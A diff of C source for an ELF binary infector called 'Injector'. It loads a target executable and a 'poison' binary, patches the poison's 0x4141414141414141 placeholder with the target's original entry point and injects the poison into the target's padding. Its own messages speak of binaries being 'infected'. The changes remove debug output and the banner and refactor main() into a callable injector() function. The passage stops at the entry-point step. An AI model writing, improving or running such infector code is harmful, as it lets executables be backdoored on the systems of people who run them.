@@ -48,7 +48,6 @@ void load_target_binary_in_memory(char *target_binary){
         fatal_msg(strcat(mmapError, strerror(errno)));
     }
     close(fd);
-    //fprintf(stdout, "[DEBUG] address of target binary: %p\n", target_memory_address); 
 }
 
 
@@ -71,7 +70,6 @@ void load_poison_binary_in_memory(char *poison_binary){
         fatal_msg(strcat(readError, strerror(errno)));
     }
     close(fd);
-    //fprintf(stdout, "[DEBUG] address of poison binary: %p\n", poison_address); 
 }
 
 
@@ -118,24 +116,20 @@ void patch_section_header(Elf64_Ehdr* target_binary_header){
 
 
 void patch_poison(Elf64_Ehdr* target_binary_header, Elf64_Addr original_entry_point){
-        for(int i=0; i<poison_size; i++){
-            if (*(unsigned long*)poison_address == 0x4141414141414141){
-                *(unsigned long*)poison_address = original_entry_point;
-                break;
-            }
-            poison_address++;
+    for(int i=0; i<poison_size; i++){
+        if (*(unsigned long*)poison_address == 0x4141414141414141){
+            *(unsigned long*)poison_address = original_entry_point;
+            break;
         }
+        poison_address++;
+    }
 }
-
-
-
 
 void write_to_disk(){
     int ret_code = munmap(target_memory_address, target_binary_size);
     if (ret_code == -1){
         fatal_msg(strcat(munmapError, strerror(errno)));
     }
-
 }
 
 
@@ -144,30 +138,15 @@ void inject_poison(char* injected_address){
 }
 
 
-void banner(){
-    fprintf(stdout, AC_GREEN "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n" AC_NORMAL);
-    fprintf(stdout, AC_GREEN "#\t\t\t\t\tInjector\t\t\t\t\t\t\t#\n" AC_NORMAL);
-    fprintf(stdout, AC_GREEN "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\n\n" AC_NORMAL);
-}
 
-
-
-
-int main(int argc, char *argv[]){
-    if (argc != 3){
-        fprintf(stderr, AC_RED "Usage: <%s> <target_binary> <poison_binary>\n" AC_NORMAL, argv[0]);
-        exit(0);
-    }
-    banner();
-    char *target_binary = argv[1];
-    char *poison_binary = argv[2];
+int injector(char *target_binary, char*poison_binary){
     load_target_binary_in_memory(target_binary);
     load_poison_binary_in_memory(poison_binary);
     char* injected_address = poison_address;
     Elf64_Ehdr* target_binary_header = (Elf64_Ehdr*)target_memory_address;
     int pad_size = get_padding_size(target_binary_header);
     if (pad_size < poison_size){
-        fprintf(stdout, AC_RED, "[-] Not enough space for poison, binary '%s' was not infected...\n" AC_NORMAL, target_binary);
+        fprintf(stdout, AC_RED "[-] Not enough space for poison, binary '%s' was not infected...\n" AC_NORMAL, target_binary);
         exit(0);
     }
     // save original entry point
